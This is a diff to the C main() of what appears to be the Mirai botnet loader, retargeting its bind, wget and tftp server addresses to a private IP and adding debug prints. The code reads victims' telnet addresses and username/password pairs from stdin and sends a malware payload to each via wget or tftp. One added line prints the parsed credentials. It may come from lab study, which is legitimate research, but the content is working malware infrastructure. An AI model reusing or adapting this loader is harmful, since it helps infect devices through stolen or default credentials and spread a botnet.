@@ -29,13 +29,14 @@ int main(int argc, char **args)
 #ifdef DEBUG
     addrs_len = 1;
     addrs = calloc(4, sizeof (ipv4_t));
-    addrs[0] = inet_addr("0.0.0.0");
+    //addrs[0] = inet_addr("0.0.0.0");
+    addrs[0] = inet_addr("192.168.179.164"); // Address to bind to
 #else
     addrs_len = 2;
     addrs = calloc(addrs_len, sizeof (ipv4_t));
 
-    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
-    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
+    addrs[0] = inet_addr("192.168.179.164"); // Address to bind to
+    addrs[1] = inet_addr("192.168.179.164"); // Address to bind to
 #endif
 
     if (argc == 2)
@@ -50,7 +51,7 @@ int main(int argc, char **args)
     }
 
     /*                                                                                   wget address           tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
+    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "192.168.179.164", 80, "192.168.179.164")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
@@ -63,22 +64,26 @@ int main(int argc, char **args)
     {
         char strbuf[1024];
 
+        printf("ready get from stdin.\n");
         if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
             break;
 
         util_trim(strbuf);
+        printf("ready get from stdin 1.\n");
 
         if (strlen(strbuf) == 0)
         {
             usleep(10000);
             continue;
         }
+        printf("ready get from stdin %s.\n", strbuf);
 
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) == NULL)
             printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         else
         {
+            printf("OK to parse telnet info: \"%s-%s\" Format -> ip:port user:pass arch\n", info.user, info.pass);
             if (srv == NULL)
                 printf("srv == NULL 2\n");
 
